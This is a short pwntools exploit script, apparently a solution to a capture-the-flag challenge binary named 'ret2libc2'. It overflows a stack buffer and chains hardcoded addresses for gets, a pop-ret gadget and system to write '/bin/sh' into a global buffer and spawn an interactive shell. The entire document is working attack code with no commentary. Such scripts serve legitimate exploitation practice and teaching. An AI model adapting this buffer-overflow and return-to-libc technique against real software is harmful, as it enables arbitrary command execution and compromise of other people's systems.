from pwn import *

gets_addr = 0x08048460
system_addr = 0x08048490
pop_ebx_ret_addr = 0x0804843d
buf2_addr = 0x0804a080
offset = 0x6c + 4

payload = b'A'*offset + p32(gets_addr) + p32(pop_ebx_ret_addr) \
	+ p32(buf2_addr) + p32(system_addr) \
	+ p32(0xdeadbeef) + p32(buf2_addr)

sh = process("./ret2libc2")
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()
